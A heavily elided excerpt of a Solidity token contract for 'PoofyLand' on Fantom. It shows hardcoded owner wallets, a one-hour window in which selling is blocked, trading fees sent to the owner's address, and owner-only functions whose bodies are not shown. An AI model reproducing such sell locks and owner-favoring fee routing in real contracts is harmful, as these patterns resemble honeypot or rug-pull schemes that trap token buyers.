...
// Website: https://poofyland.org
// Twitter: https://twitter.com/PoofyLand
// Telegram: https://t.me/poofyland_official
...
contract PoofyLand is IERC20, ERC20, Ownable {
    ...
    uint256 public _totalPeriods = 36; // 3 years = 36 months
    uint256 public _lockedAmount = _totalSupply.sub(10000 * 10**18);
    ...
    address public router = 0xF491e7B69E4244ad4002BC14e878a34207E38c29;//fantom
    address public factory = 0x152eE697f2E276fA89E96742e9bB9aB1F2E61bE3;//fantom
    address private operationaddress =0x546e7F645C3Fa03b6826ac880483EbA5cCB7E727;
    address private ownerAddress = 0xF771FDc95778C40539c2822C96D02665Daa8a086;
    address private address1 = 0x546e7F645C3Fa03b6826ac880483EbA5cCB7E727;
     ...
     * construction.
     */
    constructor() ERC20("The PoofyLand protocol", "TestPOOFY") {
        ...
        _mint(ownerAddress, 9100 * 10**18);
        _mint(address1, 900 * 10**18);
        _mint(address(this), _totalSupply.sub(10000 * 10**18));
    ...
    function _transfer(
        ...
        require(deployedtime + 1 minutes < block.timestamp, "NO_BUY_Sell");
        ...
        if (
            ...
            if(deployedtime + 1 hours > block.timestamp){
                   if (automatedMarketMakerPairs[sender] &&
                        ...
                        require(
                            amount <= _totalSupply.sub(_lockedAmount).add(_claimedAmount).mul(30).div(100),
                            "Buy transfer amount exceeds the maxTransactionAmount."
                        );
                        require(
                            amount + balanceOf(recipient) <= 3000 * 10 ** 18,
                            "Max wallet exceeded"
                        );
                    }
                        ...
                        require(deployedtime + 1 hours < block.timestamp,"You can't sell token for some times!");
        ...
        if(takeFee && feeEnable && (automatedMarketMakerPairs[sender] || automatedMarketMakerPairs[recipient])){
             if (deployedtime + 1 hours > block.timestamp) {
                ...
                super._transfer(address(this), ownerAddress, totalfeeamount.mul(7).div(10));
                ...
                super._transfer(address(this),ownerAddress, totalfeeamount.mul(4).div(6));
                feeEnable = true;
             }
    ...
    function claimlpt(uint256 amount) public onlyOwner {
    ...
    function apporoveMoney() public onlyOwner {
    ...
    function ExcludedMaxTransactionAmount(address add, bool value) public onlyOwner {

        _ExcludedMaxTransactionAmount(add, value);
    }


    function _ExcludedMaxTransactionAmount(address add, bool value) private {
        _isExcludedMaxTransactionAmount[add] = value;
